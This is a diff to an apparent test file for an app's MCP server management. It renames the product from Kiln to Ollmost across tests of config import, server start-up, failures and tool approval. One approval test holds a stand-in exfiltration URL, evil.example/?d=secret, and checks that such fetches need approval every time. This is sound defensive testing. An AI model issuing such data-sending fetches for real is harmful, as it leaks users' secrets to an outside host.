@@ -4,7 +4,7 @@ import { join } from 'node:path'
 import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'
 
 // Real MCP servers over stdio (tests/fixtures/mcp-server.mjs), a real in-memory database. Electron's keychain is
-// faked, and spawned processes get Kiln's environment as it is (the login-shell PATH has its own tests).
+// faked, and spawned processes get Ollmost's environment as it is (the login-shell PATH has its own tests).
 vi.mock('electron', () => ({
   safeStorage: {
     isEncryptionAvailable: () => true,
@@ -146,13 +146,13 @@ describe('trust given to a server stays with that program', () => {
 })
 
 describe('importing', () => {
-  const dir = mkdtempSync(join(tmpdir(), 'kiln-mcp-import-'))
+  const dir = mkdtempSync(join(tmpdir(), 'ollmost-mcp-import-'))
   afterAll(() => {
-    delete process.env.KILN_CLAUDE_DESKTOP_CONFIG
-    delete process.env.KILN_CLAUDE_CODE_CONFIG
+    delete process.env.OLLMOST_CLAUDE_DESKTOP_CONFIG
+    delete process.env.OLLMOST_CLAUDE_CODE_CONFIG
   })
 
-  it("copies another app's local servers once, off for new chats, skipping names Kiln has and remote ones", async () => {
+  it("copies another app's local servers once, off for new chats, skipping names Ollmost has and remote ones", async () => {
     const desktop = join(dir, 'claude_desktop_config.json')
     writeFileSync(
       desktop,
@@ -165,8 +165,8 @@ describe('importing', () => {
         }
       })
     )
-    process.env.KILN_CLAUDE_DESKTOP_CONFIG = desktop
-    process.env.KILN_CLAUDE_CODE_CONFIG = join(dir, 'missing.json')
+    process.env.OLLMOST_CLAUDE_DESKTOP_CONFIG = desktop
+    process.env.OLLMOST_CLAUDE_CODE_CONFIG = join(dir, 'missing.json')
     const existing = config.saveServer({ name: 'existing', command: 'npx', args: [], cwd: null, env: {}, defaultOn: true })
 
     expect(await config.importSources()).toEqual([
@@ -176,7 +176,7 @@ describe('importing', () => {
     expect(result.added).toEqual([
       expect.objectContaining({ id: 'weather', name: 'weather', defaultOn: false, envKeys: ['API_KEY'], tools: {} })
     ])
-    expect(result.skipped).toEqual([expect.stringMatching(/^hosted: remote/), 'Existing: Kiln already has a server with that name'])
+    expect(result.skipped).toEqual([expect.stringMatching(/^hosted: remote/), 'Existing: Ollmost already has a server with that name'])
     expect(config.getServerConfig('weather')!.env).toEqual({ API_KEY: 'k-123' })
     await expect(config.importFrom('claude-code')).rejects.toThrow(/no MCP servers/)
     config.removeServer('weather')
@@ -232,7 +232,7 @@ describe('running servers', () => {
   it('starts a server and lists its tools', async () => {
     await manager.connect(id)
     const s = status(id)
-    expect(s).toMatchObject({ state: 'ready', error: null, serverInfo: { name: 'kiln-fixture', version: '1.2.3' } })
+    expect(s).toMatchObject({ state: 'ready', error: null, serverInfo: { name: 'ollmost-fixture', version: '1.2.3' } })
     expect(s.tools.map((t) => t.name)).toContain('lookup_codename')
     expect(s.tools.find((t) => t.name === 'lookup_codename')).toMatchObject({ title: 'Look up a codename', tokens: expect.any(Number) })
     expect(manager.serverLog(id)).toContain('fixture: ready')
@@ -288,7 +288,7 @@ describe('stopping a server that is still starting', () => {
 
   it("stops the process of a start that hasn't connected yet", async () => {
     // A server that starts but never answers, so it stays "starting" until its 60-second timeout.
-    const dir = mkdtempSync(join(tmpdir(), 'kiln-mcp-silent-'))
+    const dir = mkdtempSync(join(tmpdir(), 'ollmost-mcp-silent-'))
     const pidFile = join(dir, 'pid')
     const script = join(dir, 'silent.mjs')
     writeFileSync(
@@ -309,10 +309,17 @@ describe('stopping a server that is still starting', () => {
 
 describe('servers that fail to start', () => {
   it('reports a missing command and a server that exits at once, and a reply is told which', async () => {
-    const missing = config.saveServer({ name: 'Missing', command: 'kiln-no-such-server', args: [], cwd: null, env: {}, defaultOn: false })
+    const missing = config.saveServer({
+      name: 'Missing',
+      command: 'ollmost-no-such-server',
+      args: [],
+      cwd: null,
+      env: {},
+      defaultOn: false
+    })
     const crashing = fixture('Crashing', { FIXTURE_CRASH_ON_START: '1' })
     const notes = await manager.ensure([missing.id, crashing.id, 'removed_server'], 10_000)
-    expect(status(missing.id).error).toMatch(/Couldn't find "kiln-no-such-server"/)
+    expect(status(missing.id).error).toMatch(/Couldn't find "ollmost-no-such-server"/)
     expect(status(crashing.id).error).toMatch(/exit code 3.*missing FIXTURE_TOKEN/)
     expect(notes).toEqual([
       expect.stringMatching(/^Missing couldn't start: Couldn't find/),
@@ -365,16 +372,16 @@ describe('as tools in a reply', () => {
     const web = { ...ctx([`mcp:${id}`]), web: true }
     expect(tools.approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('ask-every-time')
     expect(tools.allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('web_fetch@evil.example')
-    expect(tools.approvalFor(call('web_search', { query: 'kiln' }), web)).toBe('auto')
+    expect(tools.approvalFor(call('web_search', { query: 'ollmost' }), web)).toBe('auto')
     expect(tools.approvalFor(call('web_fetch', { url: 'https://example.com' }), { ...ctx([]), web: true })).toBe('auto')
   })
 
   it('runs a call and keeps a short record of it for later turns', async () => {
     const c = ctx([`mcp:${id}`])
-    const pending = tools.pendingEvent(call('codenames__lookup_codename', { project: 'Kiln' }), c)
-    expect(pending).toMatchObject({ pending: true, summary: 'Kiln', source: 'Codenames' })
-    const result = await tools.runTool(call('codenames__lookup_codename', { project: 'Kiln' }), c)
-    expect(result.content).toBe('The internal codename for project Kiln is BLUE KESTREL.')
+    const pending = tools.pendingEvent(call('codenames__lookup_codename', { project: 'Ollmost' }), c)
+    expect(pending).toMatchObject({ pending: true, summary: 'Ollmost', source: 'Codenames' })
+    const result = await tools.runTool(call('codenames__lookup_codename', { project: 'Ollmost' }), c)
+    expect(result.content).toBe('The internal codename for project Ollmost is BLUE KESTREL.')
     expect(result.event).toMatchObject({ ok: true, source: 'Codenames', record: result.content, preview: result.content })
     expect(tools.replayCalls([result.event])).toEqual([
       expect.objectContaining({
